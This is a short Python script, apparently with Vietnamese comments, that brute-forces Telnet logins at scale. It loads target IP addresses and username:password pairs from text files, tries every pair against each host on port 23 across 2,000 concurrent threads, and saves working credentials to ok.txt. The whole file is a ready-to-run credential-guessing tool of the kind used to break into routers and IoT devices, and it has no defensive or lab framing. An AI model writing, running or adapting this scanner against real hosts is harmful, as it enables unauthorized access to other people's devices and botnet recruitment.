import telnetlib
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

PORT = 23   # đổi thành 666 nếu bạn cần

def telnet_login(ip, user, password, timeout=5):
    try:
        tn = telnetlib.Telnet(ip, PORT, timeout)  
        tn.read_until(b"login: ", timeout=timeout)
        tn.write(user.encode('ascii') + b"\n")
        tn.read_until(b"Password: ", timeout=timeout)
        tn.write(password.encode('ascii') + b"\n")

        time.sleep(1)
        output = tn.read_very_eager().decode('ascii', errors='ignore')

        tn.close()
        if "incorrect" in output.lower() or "failed" in output.lower():
            return False
        else:
            return True
    except Exception:
        return False


def worker(ip, accounts):
    for user, password in accounts:
        if telnet_login(ip, user, password):
            print(f"✅ {ip} {user}:{password}")
            return f"{ip} {user}:{password}"
        else:
            print(f"🚫 {ip} {user}:{password}")
    return None


if __name__ == "__main__":
    with open("ip.txt", "r") as f:
        ip_list = [line.strip() for line in f if line.strip()]

    with open("pass.txt", "r") as f:
        accounts = [line.strip().split(":", 1) for line in f if ":" in line]

    with open("ok.txt", "w") as ok_file:
        with ThreadPoolExecutor(max_workers=2000) as executor:  # chỉnh số luồng ở đây
            future_to_ip = {executor.submit(worker, ip, accounts): ip for ip in ip_list}

            for future in as_completed(future_to_ip):
                result = future.result()
                if result:
                    ok_file.write(result + "\n")
                    ok_file.flush()